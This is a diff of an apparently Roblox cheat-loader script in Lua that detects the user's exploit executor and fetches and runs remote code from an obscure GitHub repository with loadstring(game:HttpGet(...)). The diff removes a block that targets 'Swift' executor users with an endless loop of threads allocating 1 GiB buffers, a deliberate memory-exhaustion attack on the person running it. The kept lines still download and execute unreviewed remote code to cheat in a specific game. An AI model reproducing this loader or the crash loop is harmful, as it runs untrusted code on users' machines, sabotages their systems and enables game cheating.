@@ -14,16 +14,6 @@ local Executor = identifyexecutor()
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/fu92n3m2fm223/f9n22mf292f23/main/Files/Admin.lua"))()
 
-if Executor == "Swift" then
-	while true do
-		task.spawn(function()
-			while true do
-				buffer.create(2^30)
-			end
-		end)
-	end
-end
-
 if game.PlaceId == Games.FreedomWar.Campaign then
 	if Executor == "Celery" or Executor == "Solara" or Executor == "Swift" or Executor == "Xeno" then
 		loadstring(game:HttpGet("https://raw.githubusercontent.com/fu92n3m2fm223/f9n22mf292f23/main/Files/SolaraFreedom.lua"))()
